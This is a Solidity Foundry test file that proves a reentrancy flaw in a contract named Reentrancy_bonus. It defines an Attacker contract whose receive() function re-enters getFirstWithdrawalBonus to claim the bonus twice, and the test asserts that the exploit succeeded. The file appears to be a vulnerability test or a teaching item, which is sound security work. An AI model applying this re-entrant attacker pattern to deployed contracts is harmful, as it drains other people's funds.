
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";
import {stdstorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyReentrancy_bonus is Test {
    using stdstorage for StdStorage;
    
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max);
        
        stdstore
            .target(address(_contractUnderTest))
            .sig("rewardsForA(address)")
            .with_key(address(_attacker))
            .checked_write(attackVal);
            
        stdstore
            .target(address(_contractUnderTest))
            .sig("claimedBonus(address)")
            .with_key(address(_attacker))
            .checked_write(false);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = Reentrancy_bonus(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.getFirstWithdrawalBonus(address(this));
        
        if (address(this).balance - initialSnapshot >= storedAttackVal * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            _victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
